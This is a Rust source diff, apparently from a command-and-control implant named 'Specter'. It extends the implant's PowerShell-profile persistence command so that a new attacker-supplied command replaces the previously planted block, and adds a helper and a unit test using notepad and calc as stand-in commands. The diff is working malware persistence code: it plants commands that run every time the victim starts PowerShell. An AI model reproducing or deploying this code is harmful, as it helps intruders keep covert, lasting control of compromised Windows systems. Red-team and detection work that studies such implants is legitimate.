@@ -4569,8 +4569,19 @@ fn persist_powershell_profile(op: PhantomPersistOp, command: &str) -> Result<Str
     match op {
         PhantomPersistOp::Install => {
             if existing.contains(&begin_marker) {
+                let stored = extract_delimited_command(&existing, &begin_marker, &end_marker);
+                if stored.as_deref() == Some(command) {
+                    return Ok(format!(
+                        "PowerShell profile persistence already present at {}",
+                        profile_path.display()
+                    ));
+                }
+                // Command changed — replace the existing block.
+                let without_block = remove_delimited_block(&existing, &begin_marker, &end_marker);
+                let block = format!("\n{begin_marker}\n{command}\n{end_marker}\n");
+                write_text_file(&profile_path, &format!("{without_block}{block}"))?;
                 return Ok(format!(
-                    "PowerShell profile persistence already present at {}",
+                    "PowerShell profile persistence updated at {}",
                     profile_path.display()
                 ));
             }
@@ -4618,6 +4629,28 @@ fn remove_delimited_block(text: &str, begin: &str, end: &str) -> String {
     }
 
     result
+}
+
+/// Returns the content between `begin` and `end` marker lines (exclusive), joined with `\n`.
+/// Returns `None` when the begin marker is not found.
+fn extract_delimited_command(text: &str, begin: &str, end: &str) -> Option<String> {
+    let mut inside = false;
+    let mut lines: Vec<&str> = Vec::new();
+
+    for line in text.lines() {
+        if line.trim() == begin {
+            inside = true;
+            continue;
+        }
+        if inside {
+            if line.trim() == end {
+                break;
+            }
+            lines.push(line);
+        }
+    }
+
+    if inside || !lines.is_empty() { Some(lines.join("\n")) } else { None }
 }
 
 fn read_existing_text(path: &Path) -> Result<Option<String>, String> {
@@ -5345,6 +5378,71 @@ mod tests {
             2,
             "profile should contain exactly one BEGIN/END marker pair"
         );
+        let _ = std::fs::remove_dir_all(&persist_dir);
+    }
+
+    #[test]
+    fn command_persist_powershell_profile_install_updates_changed_command() {
+        let persist_dir = make_test_persist_dir("specter_persist_psprofile_update");
+        let _guard = TestPersistGuard::install(&persist_dir);
+
+        let mut config = SpecterConfig::default();
+
+        // First install: command A.
+        let payload_a =
+            persist_payload(3, u32::from(PhantomPersistOp::Install), "Start-Process notepad.exe");
+        let pkg_a = DemonPackage::new(DemonCommand::CommandPersist, 82, payload_a);
+        let first = dispatch(
+            &pkg_a,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
+        );
+        let DispatchResult::Respond(resp) = first else {
+            panic!("expected Respond, got {first:?}");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandOutput));
+
+        // Second install: command B (different).
+        let payload_b =
+            persist_payload(3, u32::from(PhantomPersistOp::Install), "Start-Process calc.exe");
+        let pkg_b = DemonPackage::new(DemonCommand::CommandPersist, 83, payload_b);
+        let second = dispatch(
+            &pkg_b,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
+        );
+        let DispatchResult::Respond(resp) = second else {
+            panic!("expected Respond, got {second:?}");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandOutput));
+        let text = decode_command_output_text(&resp.payload);
+        assert!(text.contains("updated"), "expected 'updated' in response, got: {text}");
+
+        // Profile should still have exactly one marker pair.
+        let profile_path = persist_dir.join("powershell").join("Microsoft.PowerShell_profile.ps1");
+        let profile = std::fs::read_to_string(&profile_path).expect("read powershell profile");
+        assert_eq!(
+            profile.matches(SPECTER_PERSIST_MARKER).count(),
+            2,
+            "profile should contain exactly one BEGIN/END marker pair after update"
+        );
+        // New command must be present; old command must not.
+        assert!(profile.contains("Start-Process calc.exe"), "new command not found in profile");
+        assert!(
+            !profile.contains("Start-Process notepad.exe"),
+            "old command still present in profile after update"
+        );
+
         let _ = std::fs::remove_dir_all(&persist_dir);
     }
 
